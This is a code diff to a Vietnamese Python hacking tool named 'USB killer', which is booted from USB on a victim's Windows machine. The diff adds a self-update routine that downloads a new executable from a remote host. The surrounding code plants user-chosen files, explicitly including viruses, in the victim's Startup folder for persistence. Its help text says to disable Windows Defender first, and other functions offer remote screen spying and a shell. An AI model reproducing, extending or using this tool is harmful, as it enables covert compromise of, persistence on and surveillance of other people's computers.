@@ -3,14 +3,13 @@ colorama.init(autoreset=True)
 print(colorama.Fore.CYAN+"Đang khởi động tool, vui lòng chờ...")
 import os
 import shutil
-import colorama
 import requests
 import socket
 from zlib import decompress
-import pygame
 import threading
 import zipfile
 os.system('cls')
+version=1
 def logo():
     print(colorama.Fore.LIGHTYELLOW_EX+r'''
       |\/\/\/\/\/|
@@ -33,7 +32,7 @@ def logo():
     ██    ██ ███████ ██████      █████   ██ ██      ██      █████   ██████  
     ██    ██      ██ ██   ██     ██  ██  ██ ██      ██      ██      ██   ██ 
      ██████  ███████ ██████      ██   ██ ██ ███████ ███████ ███████ ██   ██ 
-                                                                            
+                                                                                
 Chào mừng đến với USB killer tool
 Tác giả: Phan Huỳnh Thiên Phú''')
 logo()
@@ -88,6 +87,7 @@ def view_spy():
                 return buf
 
             def screen():
+                import pygame
                 pygame.init()
                 screen = pygame.display.set_mode((1920, 1080))
                 clock = pygame.time.Clock()
@@ -117,7 +117,6 @@ def view_spy():
                         print(f'{colorama.Fore.MAGENTA}{data}', end='', flush=True)
                     else:
                         print(f'{colorama.Fore.CYAN}{data}', end='', flush=True)
-
 
 
             def shells():
@@ -189,6 +188,34 @@ def view_spy():
                                     '2: Có thể nạn nhân chưa khởi động máy\n'
                                     '3: Có thể nạn nhân đã tắt máy')
             break
+def check_update():
+    print(colorama.Fore.CYAN+'Đang kiểm tra phiên bản...')
+    try:
+        data=requests.get('https://thienphu123.pythonanywhere.com/usb').json()
+        if data['version'] == version:
+            print(colorama.Fore.CYAN + 'Bạn đang ở phiên bản mới nhất ')
+        else:
+            print(colorama.Fore.CYAN + f'Đã có phiên bản mới {data['version']}\n'
+                                       f'Bạn có muốn update lên phiên bản mới nhất không?')
+            answe = input(colorama.Fore.CYAN + 'Nhập lựa chọn (yes/no): ').lower()
+            if answe == 'yes':
+                print(colorama.Fore.CYAN+'Đang tiến hành update, vui lòng chờ ...')
+                rq2=requests.get(data['link'])
+                file=open('usb_killer.exe','wb')
+                file.write(rq2.content)
+                file.close()
+                print(colorama.Fore.CYAN+'Update hoành tất\n'
+                                         'Đang tắt tool')
+
+
+
+            elif answe == 'no':
+                print(colorama.Fore.CYAN + f'Đã chặn update, tiếp tục sử dụng phiên bản {version}')
+            else:
+                print(colorama.Fore.CYAN + 'Nhập sai lựa chọn')
+    except:
+        print(colorama.Fore.RED+'Lỗi kết nối Internet')
+
 
 def spy():
     print(colorama.Fore.YELLOW+'Lệnh này yêu cầu máy nạn nhân có kết nối mạng\n'
@@ -245,8 +272,8 @@ def file_upload():
           'Có thể up file ảnh, âm thanh, exe, virus\n'
           'Khi nạn nhân mở máy file bạn up cũng sẽ chạy theo\n'
           'Nhớ chạy lệnh /offwdf để tắt windown defender trước')
-    user=input('Nhập tên user: ')
-    file_up=input('Nhập tên file cần upload: ')
+    user=input(colorama.Fore.CYAN+'Nhập tên user: ')
+    file_up=input(colorama.Fore.CYAN+'Nhập tên file cần upload: ')
     winpath=f'{C}:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
     try:
         read_file=open(file_up,'rb')
@@ -255,9 +282,9 @@ def file_upload():
         write_file=open(f'{winpath}\\{file_up}','wb')
         write_file.write(data)
         write_file.close()
+        print(colorama.Fore.CYAN+f'Đã upload file {file_up} thành công')
     except:
         print(colorama.Fore.RED+f'Không tìm thấy {file_up}')
-
 
 def renames():
     odia = input(colorama.Fore.CYAN+'Nhập ổ đĩa chứa folder WINDOWS: ').upper()
@@ -330,6 +357,7 @@ def help():
           'Non-hacking commands\n'
           'Nhập /toolinfor : để xem thông tin của tool\n'        
           'Nhập /help : để xem các lựa chọn có sẵn trong tool\n'
+          'Nhập /update : để kiểm tra và cập nhật phiên bản mới nhất của tool\n'
           'Nhập /clear : để dọn dẹp những gì đã nhập \n'
           'Nhập /quit : để thoát tool')
 def sendmess():
@@ -353,12 +381,12 @@ def appinfor():
           'Ngôn Ngữ : Python\n'
           'Người tạo : Phan Huỳnh Thiên Phú\n'
           'Hoạt động : Win7,Win8,Win10,Win11\n'
-          'Phiên bản : Tiếng Việt 2.3.6\n'
+          'Phiên bản : Tiếng Việt V2\n'
           'Cách thức hoạt động: Tải tool này copy vào một usb boot windown ,cắm vào máy nạn nhân và boot win, sau đó gọi tool để sữ dụng (có thể liên hệ hướng dẫn)\n'
           'Liên hệ FB : https://www.facebook.com/profile.php?id=100081986971909\n'
-          f'{colorama.Fore.YELLOW}▊ : Thông báo hoặc hướng dẫn sài tool\n'
-          f'{colorama.Fore.CYAN}▊ : Lệnh nhập hoặc thông báo cho ra kết quả thành công\n'
-          f'{colorama.Fore.RED}▊ : Kết quả thất bại hoặc lỗi')
+          f'{colorama.Fore.YELLOW}Màu Vàng : Thông báo hoặc hướng dẫn sài tool\n'
+          f'{colorama.Fore.CYAN}Màu Xanh : Lệnh nhập hoặc thông báo cho ra kết quả thành công\n'
+          f'{colorama.Fore.RED}Màu Đỏ : Kết quả thất bại hoặc lỗi')
 while True:
     chosse=input(colorama.Fore.CYAN+'USB killer> ')
     if chosse=='/cmdfake':
@@ -391,6 +419,8 @@ while True:
         scan_spy()
     elif chosse=='/spam':
         covid()
+    elif chosse=='/update':
+        check_update()
     elif chosse=='/toolinfor':
         appinfor()
     elif chosse=='/clear':
